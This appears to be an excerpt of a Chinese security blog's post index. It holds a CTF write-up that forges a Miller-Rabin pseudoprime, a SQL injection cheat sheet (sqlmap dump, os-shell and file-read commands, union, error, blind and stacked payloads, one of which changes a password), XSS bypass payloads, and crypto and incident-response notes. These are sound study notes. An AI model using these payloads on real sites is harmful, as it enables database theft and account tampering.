55, 59, 63, 67, 69, 71, 79, 85, 87, 89, 91, 93, 99, 101, 105, 111, 115, 129, 133, 139, 143, 145, 151, 153, 155, 157, 159, 165, 173, 175, 177, 181, 185, 189, 191, 193, 201, 207, 209, 211, 213, 215, 221, 223, 227, 233, 237]&#x27;&#x27;&#x27;\n\nStep2：求 Sb\n在求 Sb 前，我们需要先指定 ki 的值(只要是质数就行)，这里我们指定、k2&#x3D;701、k3&#x3D;257\n我们可以看到 Sb 其实就是取了一个 ki−1(Sa+ki−1)的交集\nprint(&quot;Sb:&quot;)Sb = &#123;&#125;for a in A:    result = []    for b in Sa[a]:        if((k2*(b-1)+1) % (4*a) in Sa[a] and (k3*(b-1)+1) % (4*a) in Sa[a]):            result.append(b)        Sb[a]=result    print(a,Sb[a])&#x27;&#x27;&#x27;Sb:2 [3, 5]3 [7]5 [7, 17]7 [11, 13, 15]11 [17, 23, 41]13 [21, 47]17 [29, 63]19 [29, 39, 47, 55]23 [5, 31, 47, 59, 61]29 [21, 41, 55, 79, 99, 113]31 [17, 19, 37, 39, 63, 95]37 [13, 17, 19, 23, 29, 31, 45, 61, 69, 87, 91, 93, 97, 103, 105, 119, 135, 143]41 [17, 35, 63, 67, 69, 99, 117, 145, 149, 151]43 [31, 33, 35, 37, 47, 61, 85, 87, 89, 105, 143]47 [41, 45, 59, 69, 71, 79, 95, 103, 147, 161, 181]53 [27, 61, 65, 67, 75, 83, 85, 87, 133, 167, 171, 173, 181, 189, 191, 193]59 [33, 51, 69, 79, 95, 97, 113, 119, 127, 141, 157, 159, 165, 185]61 [7, 17, 23, 55, 59, 69, 105, 111, 129, 139, 145, 177, 181, 191, 227, 233]&#x27;&#x27;&#x27;\n\nStep3 ：CRT 求 p1\n最后从每个基的 Sb 集合中选择一个，进行 CRT 求出 p1\n\n由于是随机选取，所以 CRT 未必满足条件，因此要多次 random 选出能成功 CRT 的序列\n\np1 = - inverse(k3, k2) % k2p2 = - inverse(k2, k3) % k3print(p1, p2)print(isPrime(k2), isPrime(k3))for i in range(0, 100000):    try:        crt_A = []        crt_B = []        for a in A:            crt_A.append(random.choice(Sb[a]))            crt_B.append(4*a)        crt_A.append(p1)        crt_A.append(p2)        crt_B.append(k2)        crt_B.append(k3)        print(crt(crt_A, crt_B))        print(crt_A)        print(crt_B)        break    except:        continuep1 = crt(crt_A, crt_B)\n\n然后求一下 p1 的模数，根据 pi&#x3D;ki(p1−1)+1 求出其余的数，稍微调整一下大小到 600bits-900bits 之间即可\nd = &#123;&#125;for n in crt_B:    k = factorize(n)    for key in k.keys():        if(key in d.keys()):            if(d[key] &lt; k[key]):                d[key] = k[key]        else:            d[key] = k[key]mod_number = 1for key in d.keys():    mod_number *= pow(key, d[key])print(&#x27;mod:&#x27;, mod_number)for _ in range(100000):    if(_ % 10000 == 0):        print(_)    p1 = p1+mod_number*_*pow(2,100)    p2 = k2*(p1-1)+1    p3 = k3*(p1-1)+1    if(isPrime(p1) and isPrime(p2) and isPrime(p3)):        n = p1*p2*p3        if(miller_rabin(n, 64)):            print(p1, p2, p3)            print(n)            print(miller_rabin(n, 64))            break\n\n完整 exp# https://eprint.iacr.org/2018/749.pdfimport libnumfrom libnum.factorize import factorizefrom sage.all import *import randomfrom Crypto.Util.number import inverse, isPrimedef generate_basis(n):    basis = [True] * n    for i in range(3, int(n**0.5)+1, 2):        if basis[i]:            basis[i*i::2*i] = [False]*((n-i*i-1)//(2*i)+1)    return [2] + [i for i in range(3, n, 2) if basis[i]]def miller_rabin(n, b):    &quot;&quot;&quot;    Miller Rabin test testing over all    prime basis &lt; b    &quot;&quot;&quot;    basis = generate_basis(b)    if n == 2 or n == 3:        return True    if n % 2 == 0:        return False    r, s = 0, n - 1    while s % 2 == 0:        r += 1        s //= 2    for b in basis:        x = pow(b, s, n)        if x == 1 or x == n - 1:            continue        for _ in range(r - 1):            x = pow(x, 2, n)            if x == n - 1:                break        else:            return False    return TrueA = generate_basis(64)print(&#x27;A:&#x27;, A)Sa = &#123;&#125;print(&quot;Sa: &quot;)for a in A:    Sa[a] = []    for _ in range(3, 4*a-1, 2):        if libnum.jacobi(a, _) == -1:            Sa[a].append(_)    print(a, Sa[a])k2 = 701k3 = 257print(&quot;Sb:&quot;)Sb = &#123;&#125;for a in A:    result = []    for b in Sa[a]:        if((k2*(b-1)+1) % (4*a) in Sa[a] and (k3*(b-1)+1) % (4*a) in Sa[a]):            result.append(b)        Sb[a]=result    print(a,Sb[a])p1 = - inverse(k3, k2) % k2p2 = - inverse(k2, k3) % k3print(p1, p2)print(isPrime(k2), isPrime(k3))for i in range(0, 100000):    try:        crt_A = []        crt_B = []        for a in A:            crt_A.append(random.choice(Sb[a]))            crt_B.append(4*a)        crt_A.append(p1)        crt_A.append(p2)        crt_B.append(k2)        crt_B.append(k3)        print(crt(crt_A, crt_B))        print(crt_A)        print(crt_B)        break    except:        continuep1 = crt(crt_A, crt_B)d = &#123;&#125;for n in crt_B:    k = factorize(n)    for key in k.keys():        if(key in d.keys()):            if(d[key] &lt; k[key]):                d[key] = k[key]        else:            d[key] = k[key]mod_number = 1for key in d.keys():    mod_number *= pow(key, d[key])print(&#x27;mod:&#x27;, mod_number)for _ in range(100000):    if(_ % 10000 == 0):        print(_)    p1 = p1+mod_number*_*pow(2,100)    p2 = k2*(p1-1)+1    p3 = k3*(p1-1)+1    if(isPrime(p1) and isPrime(p2) and isPrime(p3)):        n = p1*p2*p3        if(miller_rabin(n, 64)):            print(p1, p2, p3)            print(n)            print(miller_rabin(n, 64))            break&#x27;&#x27;&#x27;A: [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61]Sa:2 [3, 5]3 [5, 7]5 [3, 7, 13, 17]7 [5, 11, 13, 15, 17, 23]11 [3, 13, 15, 17, 21, 23, 27, 29, 31, 41]13 [5, 7, 11, 15, 19, 21, 31, 33, 37, 41, 45, 47]17 [3, 5, 7, 11, 23, 27, 29, 31, 37, 39, 41, 45, 57, 61, 63, 65]19 [7, 11, 13, 21, 23, 29, 33, 35, 37, 39, 41, 43, 47, 53, 55, 63, 65, 69]23 [3, 5, 17, 21, 27, 31, 33, 35, 37, 39, 45, 47, 53, 55, 57, 59, 61, 65, 71, 75, 87, 89]29 [3, 11, 15, 17, 19, 21, 27, 31, 37, 39, 41, 43, 47, 55, 61, 69, 73, 75, 77, 79, 85, 89, 95, 97, 99, 101, 105, 113]31 [7, 13, 17, 19, 21, 29, 35, 37, 39, 47, 51, 53, 57, 59, 61, 63, 65, 67, 71, 73, 77, 85, 87, 89, 95, 103, 105, 107, 111, 117]37 [5, 13, 15, 17, 19, 23, 29, 31, 35, 39, 43, 45, 51, 55, 57, 59, 61, 69, 79, 87, 89, 91, 93, 97, 103, 105, 109, 113, 117, 119, 125, 129, 131, 133, 135, 143]41 [3, 7, 11, 13, 15, 17, 19, 27, 29, 35, 47, 53, 55, 63, 65, 67, 69, 71, 75, 79, 85, 89, 93, 95, 97, 99, 101, 109, 111, 117, 129, 135, 137, 145, 147, 149, 151, 153, 157, 161]43 [5, 11, 15, 23, 29, 31, 33, 35, 37, 45, 47, 59, 61, 65, 67, 69, 73, 77, 79, 83, 85, 87, 89, 93, 95, 99, 103, 105, 107, 111, 113, 125, 127, 135, 137, 139, 141, 143, 149, 157, 161, 167]47 [3, 5, 7, 13, 27, 29, 33, 41, 45, 51, 55, 57, 59, 63, 69, 71, 73, 75, 77, 79, 83, 85, 93, 95, 103, 105, 109, 111, 113, 115, 117, 119, 125, 129, 131, 133, 137, 143, 147, 155, 159, 161, 175, 181, 183, 185]53 [3, 5, 19, 21, 23, 27, 31, 33, 35, 39, 41, 45, 51, 55, 61, 65, 67, 71, 73, 75, 79, 83, 85, 87, 101, 103, 109, 111, 125, 127, 129, 133, 137, 139, 141, 145, 147, 151, 157, 161, 167, 171, 173, 177, 179, 181, 185, 189, 191, 193, 207, 209]59 [3, 7, 13, 15, 19, 27, 33, 35, 37, 51, 61, 63, 65, 69, 71, 73, 75, 77, 79, 87, 89, 93, 95, 97, 101, 107, 109, 113, 117, 119, 123, 127, 129, 135, 139, 141, 143, 147, 149, 157, 159, 161, 163, 165, 167, 171, 173, 175, 185, 199, 201, 203, 209, 217, 221, 223, 229, 233]61 [7, 11, 17, 21, 23, 29, 31, 33, 35, 37, 43, 51, 53, 55, 59, 63, 67, 69, 71, 79, 85, 87, 89, 91, 93, 99, 101, 105, 111, 115, 129, 133, 139, 143, 145, 151, 153, 155, 157, 159, 165, 173, 175, 177, 181, 185, 189, 191, 193, 201, 207, 209, 211, 213, 215, 221, 223, 227, 233, 237]Sb:2 [3, 5]3 [7]5 [7, 17]7 [11, 13, 15]11 [17, 23, 41]13 [21, 47]17 [29, 63]19 [29, 39, 47, 55]23 [5, 31, 47, 59, 61]29 [21, 41, 55, 79, 99, 113]31 [17, 19, 37, 39, 63, 95]37 [13, 17, 19, 23, 29, 31, 45, 61, 69, 87, 91, 93, 97, 103, 105, 119, 135, 143]41 [17, 35, 63, 67, 69, 99, 117, 145, 149, 151]43 [31, 33, 35, 37, 47, 61, 85, 87, 89, 105, 143]47 [41, 45, 59, 69, 71, 79, 95, 103, 147, 161, 181]53 [27, 61, 65, 67, 75, 83, 85, 87, 133, 167, 171, 173, 181, 189, 191, 193]59 [33, 51, 69, 79, 95, 97, 113, 119, 127, 141, 157, 159, 165, 185]61 [7, 17, 23, 55, 59, 69, 105, 111, 129, 139, 145, 177, 181, 191, 227, 233]30 2461 161933256682223994457337248907[3, 7, 7, 11, 23, 47, 63, 39, 31, 79, 39, 103, 151, 31, 59, 87, 127, 111, 30, 246][8, 12, 20, 28, 44, 52, 68, 76, 92, 116, 124, 148, 164, 172, 188, 212, 236, 244, 701, 257]mod: 845212916822667266857318935600434373326067214608775878317645775351280862168574601991542247144587 304495701573117440751890700669688521247884380170795996071115248354787 11163394479927415445540072763496426527918157732367271182635751615860314765242572717201537350357000818561932573315288396435774266341361498670863676541981221739664014401028330587564384701242669740856196369695370339038363927740181650866851457768843113763288312682772243647307True&#x27;&#x27;&#x27;\n\n相关  费马分解\n\nRabin 加密 Rabin 密码系统是第一个非对称密码系统，由Michael Oser Rabin 于 1979 年在论文 *Digitalized Signatures and Public-Key Functions as Intractable as Factorization* 中发表。可以证明从密文中恢复明文与分解一样困难，它的安全性来源于大整数的因子分解。优点：\n\nRabin 函数的每个输出都可以由四个可能的输入中的任何一个生成\n如果每个输出都是密文，则解密时需要额外的复杂性来识别四个可能的输入中的哪一个是真正的明文\n\n\n\n(71 条消息) CTFshow- 卷网杯 -crypto- 真·简单·不卷·现代密码签到（复现）_这就是强者的世界么的博客 -CSDN 博客\n(71 条消息) 卷王杯 - 部分 Crypto-wp_mxx307 的博客 -CSDN 博客\nkali 工具 readelf ： 查看 elf 信息\nobjdump：查看 elf 反汇编信息\n带你认识 Linux 中的 ELF 文件 | w3c 笔记 (w3cschool.cn)\n","categories":["ctf"],"tags":["ctf"]},{"title":"test","url":"/2022/05/20/test/","content":""},{"title":"SQL injection","url":"/2024/02/14/sql%20inj/","content":"[TOC]\n闭合类型：\n数字型&#x27;&quot;&#x27;)&quot;)&#x27;))\n\n在 user-agent、referer、cookie、\nsqlmap使用 sqlmap 时需要授权，不授权不可用\npython sqlmap.py http://127.0.0.1/sqli-labs/Less-5/?id=-1  --- 输出漏洞和数据信息  扫描数据库 python sqlmap.py -u http://example.com/index.php?id=1 --dbs 这将尝试查找任何可用的数据库，如果找到任何数据库，则会显示出来。扫描表 python sqlmap.py -u http://example.com/index.php?id=1 -D database_name --tables 其中 database_name 是上一步中找到的数据库名称。这将尝试查找数据库中的任何表并列出它们的名称。扫描列 python sqlmap.py -u http://example.com/index.php?id=1 -D database_name -T table_name --columns 其中 database_name 是数据库名称，table_name 是要扫描的表名。这将尝试找到表中的任何列并列出它们的名称。抓包修改可用 sqlmap启动 sqlmap 探测注入点 sqlmap.py -u ip --data=&quot;uname=admin&amp;passwd=admin&quot; --batch 爆破当前数据库名 sqlmap.py -u ip --data=&quot;uname=admin&amp;passwd=admin&quot; --batch --current-db 爆破数据表 sqlmap.py -u ip --data=&quot;uname=admin&amp;passwd=admin&quot; --batch -D security --tables 最后脱库 sqlmap.py -u ip --data=&quot;uname=admin&amp;passwd=admin&quot; --batch -D security -T users --dump 也可以将抓包内容保存，之后 sqlmap.py -r txt 文件位置 -p 要扫描的点 爆破数据库 sqlmap.py -r .txt 文件位置 -p 扫描的位置 --current-db 爆破表 sqlmap.py -r .txt 文件位置 -p 扫描的位置 -D security --tables 脱库sqlmap.py -r .txt 文件位置 -p 扫描的位置 -D security --dump\n\n\n\n在头部注入爆破中，sqlmap 需要提高扫描等级 level 和 risk，或将数据包保存，在需要检测的地方打上 *，\nlevel x(x 为 1-5) 当为 2 时会对头部的 cookie 进行扫描注入尝试，x&gt;=3 时队 user-Agent,ip,referer参数进行扫描risk x(x 1-3) 1 时进行大部分扫描 2 会增加基于事件的测试语句 3 会增加 or 语句的 sql 注入\n\n![image-20240207212939979](sql inj&#x2F;image-20240207212939979.png)\n![image-20240207213045292](sql inj&#x2F;image-20240207213045292.png)\nsqlmap 加密注入\n扫描 sqlmap.py -r ./xx.txt --batch --level 3 --tamper=&quot;base64encode.py&quot; 爆破数据库 sqlmap.py -r ./xx.txt --batch --level 3 --tamper=&quot;base64encode.py&quot; --current-db 爆破表单 sqlmap.py -r ./xx.txt --batch --level 3 --tamper=&quot;base64encode.py&quot; -D security --tables 脱库sqlmap.py -r ./xx.txt --batch --level 3 --tamper=&quot;base64encode.py&quot; -D security -T users --dump\n\n\n\nsqlmap 宽字节注入运用\n宽字节注入需要使用模块 tamper 中的“unmagicquotes.py“\nget 型常用参数 \n-u：指定注入的 URL   sqlmap -u URL–dbs：爆出所有数据库 sqlmap -u URL –dbs–dbms：指定数据库类型 sqlmap -u URL –dbms&#x3D;mysql–users：查看数据库的所有用户 sqlmap -u URL –users–current-user：查看数据库当前用户 sqlmap -u URL –current-user–current-db：查看网站当前数据库 sqlmap -u URL –current-db–is-dba：判断当前用户是否有管理员权限 sqlmap -u URL –is-dba      [11:57:52] [INFO] testing if current user is DBA    [11:57:52] [INFO] fetching current user    current user is DBA: True–roles：列出数据库所有管理员角色，仅适用于 oracle 数据库 sqlmap -u URL –roles–tables：爆出所有数据表 sqlmap -u URL -D 数据库名 –tables–columns：爆出数据库表所有列 sqlmap -u URL -D 数据库名 -T 表名 –columns–dump：爆出数据库中列中的所有数据 sqlmap -u URL -D 数据库名 -T 表名 -C 列名 –dump–dump-all：爆出数据库中所有的数据 sqlmap -u URL -D 数据库名 -T 表名 –dump-all–sql-shell：获取数据库 shell  sqlmap -u URL –sql-shell–os-shell：获取服务器 shell  sqlmap -u URL –os-shell–file-read：读取服务器文件  sqlmap -u URL –file-read “文件路径及名称”–file-write 本地文件 –file-dist 目标文件路径及名称：将本地文件上传至目标服务器–time-sec&#x3D;2：延时注入 sqlmap -u URL –time-sec&#x3D;2–batch：探测过程中不进行询问，一律选择默认-m：如果有多个 url 地址，可以把多个 url 保存成一个文本文件，-m 可以加载文本文件逐个扫描\npost 型常用参数 \n-r：指定 POST 数据文件  sqlmap -r post.txt–data：这种不需要将数据进行保存，只需要将 post 数据复制下来即可 sqlmap -u URL –data&#x3D;”post 数据”–forms：自动搜索表单的方式 sqlmap -u URL –forms–cookie&#x3D;”抓取的 cookie”：测试 cookie 字段–param-del：参数拆分字符，当 GET 型或 POST 型需要用其他字符分割测试参数的时候需要用到此参数，sqlmap -r post.txt –data&#x3D;”query&#x3D;foorbar;id&#x3D;1” –param-del–referer：在请求中伪造 http 中的 referer，当 level 参数设定为 3 或者 3 以上的时候会尝试对 referer 注入–headers：增加额外的 http 头–proxy：指定代理地址-p：指定测试参数\n联合注入  求列数，以便后续求显示位\n?id=1 and 0 order by 3;\n\n找显示位\n?id=1&#x27;) and 0 union select 1,2,3--+\n\n查库\n?id=1&#x27;) and 0 union select 1,database(),3--+\n\n查表\n?id=1&#x27;) and 0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()\n\n查列名\n?id=1&#x27;) and 0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot; and table_schema=database()\n\n查值\n?id=1&#x27;) and 0 union select 1,group_concat(id,0x7e,password,0x7e,username),3 from users\n\n有数据库的报错，\n报错注入updatexmlupdatexml 报错表名\n?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1)),1)--+\n\nupdatexml 报错列名\n?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 2,1)),1)--+\n\nupdatexml 报错值（依次查询报错）\n?id=1&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)--+\n\n报错密码或者数据过长时，用 substring（）\nupdatexml(1,concat(0x7e,substring((select password from users limit 0,1), 32)),0)--+\n\nextractvalueextractvalue 报错库名\n?id=1&#x27; and extractvalue(1,concat(0x7e,database()))--+\n\nextractvalue 报错表名\n?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+\n\nextractvalue 报错列名\n?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))--+\n\nextractvalue 报错值\n?id=1&#x27; and extractvalue(1,(select group_concat(0x7e,id,0x7e,username,0x7e,password) from users))--+\n\ngroup_concat 放不下时，可采用 limit 截断分开查询\nfloor前提：知道有多少字段数\n爆破库\n?id=-1&#x27; union select 1,count(*),concat(0x7e(database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\n\n爆破表名\n?id=-1&#x27; union select 1,count(*),concat(0x7e,(select (table_name)frominformation_schema.tables where table_schema=database() limit0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\n\n爆破字段\n?id=-1&#x27; union select 1,count(*),concat(0x7e,(select (column_name)frominformation_schema.columns where table_name=&#x27;users&#x27; limit0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\n\n爆破内容\n?id=-1&#x27; union select 1,count(*),concat(0x7e,(select (username)from users limit0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\n\n\n\n布尔盲注  猜解数据库名字长度 ?id=-1&#x27; or length(database())=7--+ 猜解数据库字符 ?id=-1&#x27; or ascii(substr(database(),1,1))=115 或?id=-1&#x27; or ascii(mid(database(),1,1))=115--+ 或?id=-1&#x27; or mid(database(),1,1)=&#x27;s&#x27;--+ 同样猜表名与字段名?id=-1&#x27; or ascii(mid(select (table_name) from information_schema.tables where table_schema=database() limit 1,1))=?--+\n\n脚本\n\n\n时间盲注?id=-1&#x27; or if(length(database())=8,sleep(5),0)--+\n\n响应时间变长说明条件正确\n过滤绕过and or 过滤\n重写oorr 或 || anandd 或 &amp;&amp;\n\n空格注释过滤了\nand 和 or 用 &amp;&amp; || 代替，&amp;&amp; 时需要编码一下 # --  闭合逃逸/s   == 括号 空格 ---&gt; %0a\n\n或者盲注\n使用十六进制\nHTTP 参数污染  服务器端有两个部分：第一部分是 tomcat 为引擎的 jsp 型服务器，第二部分是 apache 为引擎的 php 服务\n器，真正提供 web 服务的是 php 服务器，往往在 tomcat 的服务器处做过滤处理，功能类似于 waf，由于\n解析参数的机制不同，我们可以利用该原理绕过 waf 的检测；数据解析的顺序：tomcat 从前往后，\nappache 从后往前\n?id=1&amp;id=0&#x27; union select 1,2,(select group_concat(column_name)frominformation_schema.columns where table_schema=database() andtable_name=&#x27;users&#x27;)--+?id=1&amp;id=0&#x27; union select 1,2,(select concat_ws(username,0x7e,password)fromsecurity.users limit 0,1)--+\n\n有转义  宽字节  宽字节注入，利用 mysql 使用 GBK 编码，将两个字符看作一个汉字的特性，消除转义符号””，使单引号\n成功逃逸出来。这也是黑盒测试需要检测的一个点\nget 型宽字节检验 payload?id=1%df&#x27; and 1=1--+判断字段数 ?id=1%df&#x27; and 1=1 order by 4--+ 找回显，信息收集 ?id=1%df&#x27; and 1=2 union select 1,database(),3--+ 爆破数据库表 ?id=1%df&#x27; and 1=2 union select 1,2,group_concat(table_name)frominformation_schema.tables where table_schema=database()--+ 爆破字段内容：因为 &#x27;users&#x27; 中单引号会被转义，因此采取十六进制代替 &#x27;users&#x27;?id=1%df&#x27; and 1=2 union select 1,2,group_concat(column_name)frominformation_schema.columns where table_name=0x27757365727327--+\n\npost 提交  不能使用 url 编码，但是可以使用十六进制编码绕过，但是需要使用三个字节，最好的\n办法是是使用汉字(一些汉字是三个字节的就可以将后面的 \\ 消耗)\npost 中\nuname= 汉 &#x27; or updatexml(1,concat(0x7e,database(),0x7e),1)--+&amp;passwd=admin&amp;submit=Submit\n\n堆叠注入 mysqli_multi_query() 这个函数可以实现针对数据库一条或多多条数据的操作，这就导致可能产生堆叠\n注入的存在，堆叠注入的危害比普通爆破更为强烈, 可以实现数据的增删改查，木马的写入，甚至直接破\n环升格数据库\n例如插入一条数据在 users 字段中, 两条不同 sql 语句用分号隔开\n?id=1&#x27;;insert into users(username,password)values(&#x27;ikun&#x27;,&#x27;jinitaimei&#x27;)--+?id=-1&#x27; union select 1,2,(select group_concat(username,0x7e,password)fromusers)--+\n\n堆叠注入修改 Dumb 账户的密码?id=1&#x27;);update security.users set password=&#x27;IKUN&#x27; where username=&#x27;Dumb&#x27;--+\n\n% 匹配所有字段","categories":["SQL injection基础"],"tags":["SQL injection"]},{"title":"XSS","url":"/2024/02/14/xss/","content":"&lt;script&gt;alert(1)&lt;/script&gt; 在 input 中闭合 input 标签 &quot;&gt;&quot;&lt;script&gt;alert(1)&lt;/script&gt;\n\n 当特殊符号被编码或者被过滤时，\n 若单双引号正常，可用 onmouseover 事件或 onmouseout 事件 \n 这一事件的效果是当我们的鼠标碰到 input 标签的位置，也就是搜索框时，会执行 onmouseover 事件。‘或”闭合标签的单双引号 \n&#x27; onmouseover=javascript:alert(1) &#x27;\n\n&quot;onfocus=javascript:alert(&#x27;xss&#x27;)&gt;//\n\n 当某字符之间被强制加入下划线等符号或者被编码，则可用 javascript 伪协议，\n 构造闭合后新建一个 a 标签，在其中使用伪协议进行绕过 \n&quot;&gt;&lt;a href=javascript:alert(/1/)&gt;\n\n\n\n 当标签也被过滤（加下划线等或者被删除），还有大小写绕过，双写绕过 \n&quot;&gt;&lt;ScripT&gt;alert(1)&lt;/ScRipt&gt;\n\n&quot;&gt;&lt;sscriptcript&gt;alert(&#x27;xss&#x27;)&lt;/sscriptcript&gt;\n\n 当有 url 正常格式合法检查时，可在正常网址格式前加入恶意代码 \njavascript:alert(&#x27;xss&#x27;)http://www.qq.com 再 unicode 编码绕过 &amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;//http://www.baidu.com\n\n 一步步依次排查网页检测过滤的条件逐步绕过 \n 还可以直接修改隐藏属性，\n?keyword=nul&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)\n\n 还可观察数据包查看哪些字段可以被插入如 reference，cookie 等 \n 标签中有 class&#x3D;”ng-include:”则可包含有漏洞的文件进行攻击 \n?src=&#x27;/level1.php?name=&lt;p onmousedown=alert()&gt; 哈哈哈 &lt;/p&gt;&#x27;\n\n 回车（%0a）还可代替空格 \n 测试关键字 &quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;; \n\n 如果会将输入输出，可以使用以下来显示出链接 \n&lt;a href=&quot;&quot; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;\n\n\n\n 总结：想办法闭合，注意格式，绕过时双写，编码，大小写，或者用别的方法（伪协议，onclick，）\n","categories":["XSS基础"],"tags":["XSS"]},{"title":"某公司笔试题","url":"/2022/06/11/qianxin/","content":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["笔试题目1"],"tags":["网安"]},{"title":"密码学","url":"/2022/08/27/%E5%AF%86%E7%A0%81%E5%AD%A6/","content":"密码学\n密码学算法与原理\n1 绪论 2 密码学基础  P28 密码学（cryptology）是数学的一个分支，是密码编程学和密码分析学的统称。或许与作灶的密码实践起源于古希腊有关\n通过变换消息使其保密的科学和艺术叫做密码编程学，密码编程学是密码体制的设计学。\n密码分析学就是破译密文的科学和艺术。在未知密钥的情况下从密文推演出明文或密钥的艺术。\n3 古典密码 3.1 隐写术 两种隐藏明文信息的方法：隐写术（隐藏消息本身的存在）和密码编程学（通过各种文本转换的方法是消息内容不可理解）\n3.2 代替  代替密码体制\n代替密码的实现方法分类  单表代替密码  对于明文中的所有字母都使用同一个映射，为保证加密的可逆性，映射 f 是一一映射的。\n1）使用密钥的单表代替加密\n2）仿射加密\n-1 表示“逆”\n\n频率分析攻击\n基于某种语言中各个字符出现的频率不一样，表现出一定的统计规律。\n\n多表代替密码\n1）Playfair 密码\n2)  Vigenere 密码\n\n\n3）Hill 密码\n\n\n\n\n3.3 换位\n\n4 密码学数学引论 4.1 数论 素数1）除数\n5 对称密码体制 5.1 分组密码 概述\n\n\n\n\n原理\n扩散\n\n\n混乱\n\n乘积密码\n\nSP 网络\n\n\n\n\n\n雪崩效应\n\nLucifer 算法\n\n\n\n现代分组密码都属于乘积密码，分为两种类型。第一类同时使用了可逆和不可逆的基本变换部位，这一类被称为 Feistel 密码，DES 是这一类典型密码算法。第二类只使用了可逆的基本变换部位，和一类被称为非 Feistel 密码，AES 是这一类的典型密码算法。\nFeistel 密码结构：\n\n\n\n\n\n\n分组密码的设计准则S 盒的设计准则\n\nP 盒的设计准则\n轮函数 F 的设计准则\n迭代轮数\n子密钥的生成方法\n\n分组密码的工作模式  电子密码本模式 ECB\n\n\n密码分组链接模式（CBC）\n\n计数器模式（CTR）\n\n\n输出反馈模式（OFB）\n\n\n\n密码反馈模式（CFB）\n\n\n\n5.2 数据加密标准（DES）DES 概述\n\n\n\n\n\nDES 加密原理\n\n\n\n\n\n\n\n\n","categories":["密码学"],"tags":["ctf"]},{"title":"应急响应","url":"/2024/02/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","content":"\n应急响应  是什么  随着信息化的高速发展，全球每年发生的网络安全事件不计其数，组织面临的安全威胁也逐年递增，当客户系统遭受病毒传播、网络攻击、黑客入侵，这类安全事件从而导致企业声誉受损，信息业务中断、系统宕机、网络瘫痪，数据窃取，并对企业和业务运行产生直接或间接的负面影响时，由信息安全专家提供入侵原因分析、业务损失评估、系统加固建议、以及黑客溯源取证的安全服务，从而减少因黑客入侵带来的损失。\n分类\n产生原因  大型企业的业务模式多，对外暴露的服务也多，由于对外暴露的服务多，导致被攻击的面  也会扩大\n黑产团伙每天都会利用秒杀型漏洞批量扫描全网 IP除了做黑产的大哥们，还有可能会遇到传说中的 APT\n目的  应急响应的目标主要是为了阻断黑客攻击对整个安全事件发生的过程进行还原，找到问题发生的根源，并采取对应的补救措施，避免类似事件将来再次发生。\n1. 判断这次应急是否是被成功入侵的安全事件2. 阻断黑客攻击3. 找出攻击者的第一入口点，提取恶意样本4. 帮助客户梳理攻击者的攻击路线，提供漏洞修复方案\n流程\n事件判断  判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDoS 等等。\n临时处置  给出客户临时处置建议，断网隔离，保护现场环境。\n信息收集分析  收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析、样本分析。\n清理处置  直接杀掉进程，删除文件，打补丁，抑或是修复文件。\n产出报告  整理并输出完整的安全事件报告。\n应急要点：了解常见端口的攻击手法，不要相信客户说的话  处置思路  时间线\n应急前沟通1. 现场现象是什么? 如何发现的?（依据是什么）?\n2. 什么时候发现的?\n3. 目前是否有做物理隔离（断网）?\n4. 受害机器是哪个?\n5．受害服务有几台?（1 台 &#x2F;N 台)\n6. 最先发现是哪台?\n7. 这台服务器对外有哪些服务?\n8. 这台服务器于其他机器是否处于同一个内网?\n9. 操作系统类型﹖是否有公网映射业务﹖远程管理方式﹖网络边界有没有流量监控设备﹖主机侧是否有 EDR 等安全设备\n实战场景的应急响应 web 攻击事件 相关表现: 页面被篡改、恶意推广、黑词黑页、webshell\n相关危害: 导致搜索引擎告警、微信等 app 分享告警、首页敏感内容、拖库、内网沦陷等\n排查要点: 能否多个环境下复现异常现象; 确定相关资产是否存在; 恶意文件是否确实存在于服务器上\n操作要点:备份  文件，webshell 后门  查杀 ; web 日志分析 ; web 中间件  缓存处理: web 中间件配置检查; 重启 web 中间件: 服务器后门检查;\n防护措施: 加固相关 web 应用，修改相关系统的所有用户密码\n链路劫持  相关表现: 区域性服务不可用或返回异常内容\n相关危害: 导致搜索引擎告警、微信等 app 分享告警、首页敏感内容等\n排查要点: 能否多个环境下复现异常现象; 确定相关资产是否存在; 恶意文件是否确实存在于服务器上\n操作要点: 跨地区、运营商进行测试，确定受  影响范围; 在能复现的环境中判断是DNS 劫持还是 HTTP 劫持\n防护措施: 重要业务  部署 https\n代理隧道  相关表现: 持续性或间断性  外连行为 ，通常为 tcp 协议; 对 内网多个主机  有访问行为\n相关危害: 作为  跳板机  攻击其他内网资产\n排查要点:确定  存在代理隧道的  跳板机 ，通常为某时间段内集中访问内网多种资源的机器; 判断隧道类型\n防护措施: 完善内网 acl，服务器按业务需要通过  白名单策略  访问外网\n替换系统命令  相关表现: 无明显表现\n相关危害: 将  后门、木马持久化  